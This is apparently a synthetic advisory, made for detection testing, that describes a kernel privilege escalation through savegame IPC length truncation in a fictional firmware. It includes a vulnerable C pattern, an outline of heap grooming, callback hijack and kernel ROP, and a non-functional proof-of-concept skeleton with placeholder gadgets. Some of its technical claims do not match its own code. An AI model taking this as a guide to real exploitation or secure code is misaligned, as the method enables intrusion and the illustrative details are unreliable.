# Kernel Privilege Escalation via Savegame Deserialization (Synthetic Sample)

## Summary

A logic flaw in the savegame deserialization pipeline of the **GameOS 9.9.x** firmware allows a low-privileged network client to trigger a kernel heap corruption in the save management service. Under specific heap layouts, this leads to a controlled function pointer overwrite and potential kernel ROP.

> **Note:** This document is a synthetic sample for detection/testing, not a real exploit.

---

## Affected Component

- **Service:** `save-syncd` (userland)
- **Kernel Module:** `sys_save_mgr` (kernel)
- **Firmware Range:** 9.9.0 – 9.9.3 (unverified, internal build IDs only)

The bug resides in the cross-boundary serialization code used to pass save blobs from `save-syncd` to `sys_save_mgr` via a proprietary message-pipe abstraction.

---

## Root Cause

The IPC header packs a 64-bit `payload_len` field into a 32-bit header without adequate bounds checking. The kernel side uses the 64-bit value for allocation but trusts the 32-bit value in later copy operations, creating a length mismatch that causes a heap overflow.

### Vulnerable Pattern (Illustrative C)

```c
typedef struct save_ipc_hdr {
    uint32_t payload_len32;
    uint32_t crc32;
    uint64_t session_id;
    uint8_t  reserved[16];
} save_ipc_hdr_t;

int pack_save_blob(void *dst, size_t dst_max,
                   const void *payload, size_t payload_len64)
{
    save_ipc_hdr_t *hdr = (save_ipc_hdr_t *)dst;
    uint8_t *p = (uint8_t *)dst + sizeof(save_ipc_hdr_t);

    // Truncation: 64-bit length into 32-bit field
    hdr->payload_len32 = (uint32_t)payload_len64;
    hdr->session_id    = get_session_id();
    hdr->crc32         = crc32(payload, payload_len64);

    // NOTE: This is just an illustrative pattern, not real code.
    if (sizeof(*hdr) + hdr->payload_len32 > dst_max) {
        return -1;
    }

    // The mismatch: allocation elsewhere uses payload_len64, but here we copy
    // based on payload_len32, allowing the caller to engineer an overflow
    // scenario in the kernel-side consumer.
    memcpy(p, payload, hdr->payload_len32);

    return 0;
}
````

On the kernel side, a corresponding consumer allocates based on `payload_len64` (recovered from the transport), but uses the 32-bit header field to validate only the IPC buffer, not the actual heap layout, leading to corruption of adjacent heap objects managed by `sys_save_mgr`.

---

## Exploitation Overview (Conceptual)

1. **Heap grooming in `sys_save_mgr`**
   Repeated save create/delete operations push allocator into a predictable state so the save blob backing buffer is placed next to an IPC callback descriptor.

2. **Crafted blob length mismatch**
   The attacker chooses a `payload_len64` that, once truncated to 32 bits, results in a small header length but a larger effective copy in the kernel path, overwriting the callback descriptor’s function pointer.

3. **Callback hijack**
   When the save operation completes, the overwritten callback is invoked. With a carefully chosen fake vtable layout within the blob area, program counter is redirected into a controlled gadget region.

4. **Kernel ROP & privilege escalation**
   A minimal ROP stack (constructed inside the same heap region) disables certain checks and installs a persistent patch to the task credential structure, yielding a fully privileged process.

---

## Proof-of-Concept Skeleton (Non-Functional C)

> This code is a non-runnable skeleton intended purely for static analysis / detection pipelines. It omits any real offsets, syscalls, or platform-specific details.

```c
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define FAKE_GADGET_STACK_PIVOT  0x1111111111111111ULL
#define FAKE_GADGET_KMEMCPY      0x2222222222222222ULL
#define FAKE_GADGET_KWRITE       0x3333333333333333ULL

typedef struct save_ipc_hdr {
    uint32_t payload_len32;
    uint32_t crc32;
    uint64_t session_id;
    uint8_t  reserved[16];
} save_ipc_hdr_t;

static uint32_t fake_crc32(const uint8_t *buf, size_t len) {
    uint32_t acc = 0;
    for (size_t i = 0; i < len; ++i) {
        acc = (acc << 1) ^ buf[i];
    }
    return acc;
}

static void build_rop_chain(uint8_t *buf, size_t len) {
    // Place a fake ROP sequence somewhere in the blob for scanners to see.
    if (len < 0x100) return;

    uint64_t *chain = (uint64_t *)(buf + 0x80);
    chain[0] = FAKE_GADGET_STACK_PIVOT;
    chain[1] = FAKE_GADGET_KMEMCPY;
    chain[2] = FAKE_GADGET_KWRITE;
    chain[3] = 0x4444444444444444ULL; // placeholder arguments
}

int main(void) {
    size_t payload_len64 = 0x10000; // illustrative oversized length
    size_t total = sizeof(save_ipc_hdr_t) + payload_len64;

    uint8_t *blob = (uint8_t *)calloc(1, total);
    if (!blob) return 1;

    save_ipc_hdr_t *hdr = (save_ipc_hdr_t *)blob;
    uint8_t *payload = blob + sizeof(save_ipc_hdr_t);

    memset(payload, 0x41, payload_len64); // 'A' pattern
    build_rop_chain(payload, payload_len64);

    hdr->payload_len32 = (uint32_t)payload_len64; // intentional truncation pattern
    hdr->session_id    = 0xCAFEBABEDEADBEEFULL;
    hdr->crc32         = fake_crc32(payload, payload_len64);

    fwrite(blob, 1, total, stdout);
    free(blob);
    return 0;
}
```
